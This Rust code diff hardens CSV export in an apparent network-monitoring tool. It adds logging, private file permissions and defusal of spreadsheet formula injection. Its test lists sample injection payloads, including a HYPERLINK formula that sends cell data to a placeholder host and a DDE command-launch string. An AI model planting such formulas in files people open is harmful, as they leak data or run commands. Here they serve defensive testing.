@@ -56,6 +56,7 @@ pub async fn run(state: Arc<Mutex<AppState>>, cfg: Config) {
                         );
                     }
                     Err(e) => {
+                        crate::errlog::log("recording", format!("could not open the CSV: {e}"));
                         let mut s = state.lock().unwrap();
                         s.logging_requested = false;
                         s.notice_event(
@@ -102,7 +103,11 @@ pub async fn run(state: Arc<Mutex<AppState>>, cfg: Config) {
         };
 
         if let Some(f) = file.as_mut() {
-            if f.write_all(body.as_bytes()).await.is_err() {
+            if let Err(e) = f.write_all(body.as_bytes()).await {
+                crate::errlog::log(
+                    "recording",
+                    format!("write failed, recording stopped: {e} ({rows} rows lost)"),
+                );
                 let mut s = state.lock().unwrap();
                 s.logging_requested = false;
                 s.notice = Some("recording failed — write error".to_string());
@@ -121,13 +126,14 @@ pub async fn run(state: Arc<Mutex<AppState>>, cfg: Config) {
 async fn open() -> Result<(tokio::fs::File, std::path::PathBuf), String> {
     let path = crate::store::session_log_path().ok_or("no data directory")?;
     if let Some(dir) = path.parent() {
-        tokio::fs::create_dir_all(dir)
-            .await
-            .map_err(|e| e.to_string())?;
+        crate::store::create_dir_private(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
     }
-    let mut f = tokio::fs::File::create(&path)
-        .await
-        .map_err(|e| e.to_string())?;
+    let mut opts = tokio::fs::OpenOptions::new();
+    opts.write(true).create(true).truncate(true);
+    #[cfg(unix)]
+    // tokio's OpenOptions carries its own `mode`, so no std trait import here.
+    opts.mode(crate::store::FILE_MODE);
+    let mut f = opts.open(&path).await.map_err(|e| e.to_string())?;
     f.write_all(HEADER.as_bytes())
         .await
         .map_err(|e| e.to_string())?;
@@ -367,19 +373,35 @@ pub fn format_events_export(events: impl IntoIterator<Item = EventItem>) -> Stri
 pub fn export_events(events: Vec<EventItem>) -> Result<std::path::PathBuf, String> {
     let path = crate::config::Config::events_export_path().ok_or("no config directory")?;
     if let Some(dir) = path.parent() {
-        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
+        crate::store::create_dir_private(dir).map_err(|e| e.to_string())?;
     }
-    std::fs::write(&path, format_events_export(events)).map_err(|e| e.to_string())?;
+    crate::store::write_private(&path, format_events_export(events)).map_err(|e| e.to_string())?;
     Ok(path)
 }
 
-/// Quote a CSV field when it contains anything that would break parsing.
-/// Target labels and process names are user- and system-supplied.
+/// Quote a CSV field when it contains anything that would break parsing, and
+/// defuse it when a spreadsheet would read it as a formula.
+///
+/// Only text goes through here — target labels, process names, event messages —
+/// and none of it is ours. A process name comes from whatever is running, and
+/// an SSID comes from whoever owns the nearest access point, so a field can
+/// start with `=`, `+`, `-` or `@` on purpose: Excel and Sheets treat those as
+/// the start of a formula, and `=HYPERLINK("http://…"&A1)` in a recording or in
+/// the bundle's events.csv would fire when the file is opened. A leading
+/// apostrophe is the standard defusal — the cell still reads as the original
+/// text, and every CSV parser that isn't a spreadsheet sees one extra
+/// character rather than a different value.
 pub fn field(v: &str) -> String {
-    if v.contains([',', '"', '\n', '\r']) {
-        format!("\"{}\"", v.replace('"', "\"\""))
-    } else {
-        v.to_string()
+    // Tab and carriage return count: a formula can be hidden behind leading
+    // whitespace that the spreadsheet strips before parsing.
+    let risky = v.starts_with(['=', '+', '-', '@', '\t', '\r']);
+    let quote = v.contains([',', '"', '\n', '\r']);
+    match (risky, quote) {
+        (false, false) => v.to_string(),
+        (false, true) => format!("\"{}\"", v.replace('"', "\"\"")),
+        // A defused field is always quoted: the apostrophe has to survive
+        // whatever else is in there, and quoting it is never wrong.
+        (true, _) => format!("\"'{}\"", v.replace('"', "\"\"")),
     }
 }
 
@@ -395,6 +417,27 @@ mod tests {
         assert_eq!(field("my target, home"), "\"my target, home\"");
         assert_eq!(field("say \"hi\""), "\"say \"\"hi\"\"\"");
         assert_eq!(field("line\nbreak"), "\"line\nbreak\"");
+    }
+
+    /// An SSID is broadcast by whoever owns the access point, and a process
+    /// name by whatever is running: both reach a CSV people open in Excel.
+    #[test]
+    fn spreadsheet_formulas_are_defused() {
+        for evil in [
+            "=HYPERLINK(\"http://x/\"&A1)",
+            "+1+1",
+            "-2+3",
+            "@SUM(A1)",
+            "\t=cmd|'/c calc'!A1",
+        ] {
+            let out = field(evil);
+            assert!(out.starts_with("\"'"), "{evil} → {out}");
+        }
+        // The quoting inside a defused field still escapes quotes.
+        assert_eq!(field("=\"x\""), "\"'=\"\"x\"\"\"");
+        // And ordinary text keeps its exact value, apostrophe-free.
+        assert_eq!(field("192.168.1.1"), "192.168.1.1");
+        assert_eq!(field("hop 2→1.1.1.1"), "hop 2→1.1.1.1");
     }
 
     #[test]
